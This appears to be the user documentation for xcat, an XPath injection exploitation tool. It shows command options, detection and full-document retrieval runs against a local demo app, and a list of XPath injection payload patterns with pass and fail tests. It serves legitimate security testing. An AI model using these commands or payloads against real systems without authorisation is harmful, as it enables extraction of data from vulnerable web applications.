# Common options

All commands except `ip` take the same arguments. These describe the attack you are making, 
and allows xcat to explore it and work out what features it can use.

At _minimum_ you need to supply:

- A URL to attack (`url`)
- A target parameter which is vulnerable to XPath injection (`target_parameter`)
- A value for this parameter, and optionally others if required (`parameters`)
- A string or a status code that is present in the response if the condition is True (`--true-string` and `--true-code`)

For example, to attack the [example vulnerable application](https://github.com/orf/xcat_app) you would use:

`xcat run http://localhost:4567/ query query=Rogue --true-string=Lawyer` 

This instructs `xcat` that:

- The vulnerable URL is `http://localhost:4567/`
- The vulnerable parameter is `query`
- The parameters to pass to the URL are `query=Rogue`
- The true condition is `Lawyer` being present in the response

## Additional options

#### `--headers`

This argument can be used to send custom headers, including cookies. It should be a file path to a plain text 
file containing lines in the following format:

```text
Header-Name: header-value
```

**Example:** `xcat run ... --headers=my-header-file.txt`

#### `--body`

This argument is a path to a file containing a request body to send. This is helpful if you are exploiting a 
POST request that has a vulnerable URL parameter, but also require a POST body to be sent. The file contents 
are sent as-is.

**Example:** `xcat run ... --headers=my-request-body.txt`

#### `--encode`

xcat currently supports manipulating either URL or form parameters. This allows you to switch between 
sending the exploit payload via the POST body or URL arguments.

**Example:** `xcat run ... --encode=form`

#### `--fast`

When this flag is present then xcat will only retrieve the first 15 characters of strings. This can drastically speed
up retrieval in documents that contain very large strings.

**Example:** `xcat run ... --fast`

#### `--concurrency`

This parameter limits the number of concurrent connections xcat can make. Setting it too low will slow down 
exploitation, but can reduce the load on the target server.

**Example:** `xcat run ... --concurrency=10`

#### `--enable/--disable`

xcat attempts to intelligently detect what features the target server supports and uses these to speed up 
retrieval. These flags let you force enable or disable these features.

**Example:** `xcat run ... --enable=substring-search`

#### `--oob`

Enables the `oob` server. For more info see [the oob server documentation.](oob.md)

**Example:** `xcat run ... --oob=$EXTERNAL_IP:$EXTERNAL_PORT`

# Detect

This command will print out what injection xcat has detected, as well as a list of features and their status. You 
can use this to quickly explore an injection and different parameter values before commencing an attack.

```shell
$ xcat detect http://localhost:4567/ query query=Rogue --true-string=Lawyer
function call - last string parameter - single quote
Example: /lib/something[function(?)]

Detected features:
xpath-2: True
xpath-3: False
xpath-3.1: False
normalize-space: True
substring-search: True
codepoint-search: True
environment-variables: False
document-uri: True
base-uri: True
current-datetime: True
unparsed-text: False
doc-function: True
linux: False
expath-file: False
saxon: False
oob-http: False
oob-entity-injection: False
``` 

# run

This is the core function of xcat. It will retrieve the whole document that is being queried with the
vulnerable xpath expression.

```shell
$ xcat run http://localhost:4567/ query query=Rogue --true-string=Lawyer
<root first="1" second="2" third="">
	<!--My lovely library-->
	<books>
		<book>
			<title>
				Rogue Lawyer
			</title>
			<author>
				John Grisham
			</author>
...
```

# shell

This is one of the most powerful features of xcat. 
Please see [the dedicated `shell` documentation here](shell.md)


# injections

This command prints out all the injections xcat currently can use, along with the sample expressions 
xcat will use to test if this injection works.

```shell
$ xcat injections
Supports 10 injections:
Name: integer
 Example: /lib/book[id=?]
 Tests:
   ? and 1=1 = passes
   ? and 1=2 = fails
Name: string - single quote
 Example: /lib/book[name='?']
 Tests:
   ?' and '1'='1 = passes
   ?' and '1'='2 = fails
Name: string - double quote
 Example: /lib/book[name="?"]
 Tests:
   ?" and "1"="1 = passes
   ?" and "1"="2 = fails
Name: attribute name - prefix
 Example: /lib/book[?=value]
 Tests:
   1=1 and ? = passes
   1=2 and ? = fails
Name: attribute name - postfix
 Example: /lib/book[?=value]
 Tests:
   ? and not 1=2 and ? = passes
   ? and 1=2 and ? = fails
Name: element name - prefix
 Example: /lib/something?/
 Tests:
   .[true()]/? = passes
   .[false()]/? = fails
Name: element name - postfix
 Example: /lib/?something
 Tests:
   ?[true()] = passes
   ?[false()] = fails
Name: function call - last string parameter - single quote
 Example: /lib/something[function(?)]
 Tests:
   ?') and true() and string('1'='1 = passes
   ?') and false() and string('1'='1 = fails
Name: function call - last string parameter - double quote
 Example: /lib/something[function(?)]
 Tests:
   ?") and true() and string("1"="1 = passes
   ?") and false() and string("1"="1 = fails
Name: other elements - last string parameter - double quote
 Example: /lib/something[function(?) and false()] | //*[?]
 Tests:
   ?") and false()] | //*[true() and string("1"="1 = passes
   ?") and false()] | //*[false() and string("1"="1 = fails
```

# ip

This command is a convenience function to get your current external IP address. It takes 
no arguments.

```shell
$ xcat ip
123.210.60.90
```
